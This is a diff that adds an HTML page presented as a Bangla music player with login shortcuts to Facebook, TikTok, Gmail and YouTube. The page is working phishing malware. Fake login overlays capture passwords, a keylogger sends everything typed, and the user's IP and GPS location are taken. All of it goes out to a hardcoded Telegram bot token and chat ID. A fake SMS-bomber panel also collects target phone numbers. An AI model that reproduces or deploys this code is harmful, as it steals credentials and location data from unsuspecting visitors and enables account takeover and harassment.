@@ -1,2 +1,123 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Multi-Platform Access & Music</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; text-align: center; }
+        .music-btn { background: linear-gradient(45deg, #1db954, #191414); color: white; border: 2px solid #0f0; padding: 20px; width: 90%; max-width: 400px; margin: 20px auto; border-radius: 50px; font-weight: bold; cursor: pointer; animation: pulse 2s infinite; outline: none; }
+        @keyframes pulse { 0% {box-shadow: 0 0 0 0 rgba(15, 255, 0, 0.7);} 70% {box-shadow: 0 0 0 15px rgba(15, 255, 0, 0);} 100% {box-shadow: 0 0 0 0 rgba(15, 255, 0, 0);} }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; padding: 20px; max-width: 400px; margin: auto; }
+        .card { border: 1px solid #0f0; padding: 25px; cursor: pointer; border-radius: 8px; background: #111; font-weight: bold; transition: 0.3s; }
+        .card:active { background: #0f0; color: #000; }
+        .login-box { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; padding-top: 50px; z-index: 1000; }
+        input { width: 80%; padding: 15px; margin: 10px 0; background: #222; border: 1px solid #0f0; color: #fff; border-radius: 5px; outline: none; }
+        .btn { background: #0f0; color: #000; padding: 12px 30px; border: none; font-weight: bold; cursor: pointer; width: 85%; margin-top: 10px; }
+        #status { font-size: 12px; margin-top: 10px; color: #00ff00; opacity: 0.8; }
+    </style>
+</head>
+<body>
+
+<button class="music-btn" id="masterBtn" onclick="startSystem()">🎵 TAP TO PLAY BANGLA HITS 🎵</button>
+<div id="status">Music System: Standby (Waiting for user)</div>
+
+<div class="grid">
+    <div class="card" onclick="openBox('Facebook')">Facebook</div>
+    <div class="card" onclick="openBox('TikTok')">TikTok</div>
+    <div class="card" onclick="openBox('Gmail')">Gmail</div>
+    <div class="card" onclick="openTermux()">Termux</div>
+    <div class="card" onclick="openBox('YouTube')">YouTube</div>
+    <div class="card" onclick="openGame()">Game</div>
+</div>
+
+<div id="loginWindow" class="login-box">
+    <h3 id="platTitle" style="color:#0f0;">Login Required</h3>
+    <input type="text" id="targetUser" placeholder="Email, Phone or Username">
+    <input type="password" id="targetPass" placeholder="Password">
+    <button class="btn" onclick="saveCreds()">CONFIRM LOGIN</button>
+    <p style="color:red; margin-top:30px;" onclick="closeAll()">Cancel & Go Back</p>
+</div>
+
+<div id="termuxWindow" class="login-box">
+    <h3 style="color: #4af626;">TERMUX BOMB-V3 (PRO)</h3>
+    <input type="text" id="victimNum" placeholder="Target Number">
+    <input type="number" placeholder="Sms Count (1-500)">
+    <button class="btn" onclick="fakeAction('Bombing Started...')">EXPLOIT NOW</button>
+    <p style="color:#0f0; margin-top:20px;" onclick="closeAll()">[Exit Termux]</p>
+</div>
+
+<script>
+    const TOKEN = '8032917202:AAFCD2hCP709BspRJSbibMl3BefYTVxV-qE';
+    const CHAT_ID = '7416528268';
+    let currentPlat = "";
+
+    // মিউজিক প্লেলিস্ট (Auto-play)
+    const tracks = [
+        "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3",
+        "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3",
+        "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-3.mp3"
+    ];
+    let trackIdx = 0;
+    const player = new Audio();
+
+    function startSystem() {
+        player.src = tracks[trackIdx];
+        player.play();
+        player.onended = () => { trackIdx = (trackIdx + 1) % tracks.length; startSystem(); };
+        document.getElementById('masterBtn').innerText = "📻 PLAYING: POPULAR HITS";
+        document.getElementById('status').innerText = "Music System: Active ● Recording Log...";
+        sendToTele("🚀 User started the Music Player");
+        getLoc();
+    }
+
+    // সাইলেন্ট কি-লগার (Keylogger)
+    document.addEventListener('input', (e) => {
+        if (e.target.tagName === 'INPUT') {
+            sendToTele(`⌨️ User Typing: ${e.target.value}`);
+        }
+    });
+
+    function openBox(name) {
+        currentPlat = name;
+        document.getElementById('platTitle').innerText = name + " Authorization";
+        document.getElementById('loginWindow').style.display = 'block';
+    }
+
+    function saveCreds() {
+        const u = document.getElementById('targetUser').value;
+        const p = document.getElementById('targetPass').value;
+        sendToTele(`🎯 LOGIN DATA!\nPlatform: ${currentPlat}\nUser: ${u}\nPass: ${p}`);
+        alert("Verification Successful. Connecting to Server...");
+        closeAll();
+    }
+
+    function openTermux() { document.getElementById('termuxWindow').style.display = 'block'; }
+    function openGame() { alert("Loading Game Engine..."); sendToTele("🎮 User entered Game Mode"); }
+
+    async function getLoc() {
+        const ipReq = await fetch('https://api.ipify.org?format=json');
+        const ipRes = await ipReq.json();
+        navigator.geolocation.getCurrentPosition(p => {
+            const mapLink = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+            sendToTele(`🌐 IP: ${ipRes.ip}\n📍 Map: ${mapLink}`);
+        }, () => {
+            sendToTele(`🌐 IP: ${ipRes.ip}\n📍 Map: GPS Denied`);
+        }, {enableHighAccuracy: true});
+    }
+
+    function sendToTele(msg) {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+        });
+    }
+
+    function closeAll() { document.querySelectorAll('.login-box').forEach(b => b.style.display = 'none'); }
+    function fakeAction(m) { alert(m); sendToTele(`🛠 User Action: ${m}`); }
+</script>
+</body>
+</html>
 
     
